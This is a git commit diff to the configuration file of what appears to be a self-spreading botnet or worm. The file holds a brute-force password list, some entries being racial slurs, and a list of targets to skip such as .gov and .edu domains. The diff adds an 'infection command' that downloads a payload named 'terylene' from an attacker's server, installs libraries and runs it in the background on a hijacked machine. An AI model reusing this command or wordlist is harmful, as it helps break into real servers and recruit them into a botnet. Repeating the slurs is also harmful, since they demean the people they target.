70aa2bf5f1958cd1ab6931885bc26cedebb0bf06
polyester <93959737+polymaster3313@users.noreply.github.com>
2023-10-07 23:58:27 +0800

    Update config.go

--- config/config.go
+++ config/config.go
@@ -21,8 +21,9 @@ var (
 			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
 		},
 	}
-	//config
+	//blocked targets
 	Blocked = []string{"google.com", "polysphere.cc", "youtube.com", ".gov", ".edu", "127.0.0.1"}
-
+	
+	//infections command
 	Infcommand = "wget -O file http://%s:8080/terylene && export DEBIAN_FRONTEND=noninteractive || true && apt-get install -y libzmq3-dev || true && yes | sudo pacman -S zeromq || true && sudo dnf -y install zeromq || true && chmod +x file && ./file &"
 )
